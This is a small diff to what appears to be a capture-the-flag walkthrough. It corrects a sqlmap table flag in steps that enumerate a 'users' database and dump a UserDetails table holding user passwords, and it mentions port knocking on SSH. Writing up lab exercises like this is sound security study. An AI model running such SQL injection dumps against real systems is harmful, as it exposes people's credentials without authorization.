@@ -31,7 +31,7 @@ SSH is secured by using technique of  port knocking. `knockd` is used for implem
 2. `sqlmap -r req.txt -D users --tables`
 "Get the tables from users database"
 
-3. `sqlmap -r req.txt -D users -t UserDetails --dump`
+3. `sqlmap -r req.txt -D users -T UserDetails --dump`
 "Dump the table **UserDetails**
 
 UserDetail table contains info about users and their passwords.
